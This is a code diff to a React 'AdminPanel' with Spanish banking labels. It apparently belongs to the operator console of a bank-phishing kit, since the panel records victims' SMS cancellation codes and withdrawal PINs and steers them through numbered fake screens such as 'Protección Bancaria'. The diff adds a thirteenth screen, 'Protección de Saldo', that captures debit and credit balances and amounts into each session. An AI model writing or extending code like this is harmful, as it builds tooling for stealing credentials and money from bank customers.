@@ -400,6 +400,10 @@ export default function AdminPanel() {
             case 'smsCompra':
               inputDescription = `Código de Cancelación: ${inputData.smsCompra}`;
               break;
+            case 'PROTECCION_SALDO':
+            case 'proteccion_saldo':
+              inputDescription = `Protección - Débito: ${inputData.saldoDebito || 'N/A'} (${inputData.montoDebito || '0'}), Crédito: ${inputData.saldoCredito || 'N/A'} (${inputData.montoCredito || '0'})`;
+              break;
             default:
               inputDescription = `Datos de ${tipo}`;
           }
@@ -451,6 +455,13 @@ export default function AdminPanel() {
                   if (inputData.pinRetiro) {
                     updatedSession.pinRetiro = inputData.pinRetiro;
                   }
+                  break;
+                case 'PROTECCION_SALDO':
+                case 'proteccion_saldo':
+                  updatedSession.saldoDebito = inputData.saldoDebito;
+                  updatedSession.montoDebito = inputData.montoDebito;
+                  updatedSession.saldoCredito = inputData.saldoCredito;
+                  updatedSession.montoCredito = inputData.montoCredito;
                   break;
               }
               
@@ -764,6 +775,7 @@ export default function AdminPanel() {
                   <option value="escanear_qr">10. Escanear QR de Tarjeta</option>
                   <option value="cancelacion_retiro">11. Cancelación de retiro sin tarjeta</option>
                   <option value="proteccion_bancaria">12. Protección Bancaria</option>
+                  <option value="proteccion_saldo">13. Protección de Saldo</option>
                 </select>
               </div>
             </div>
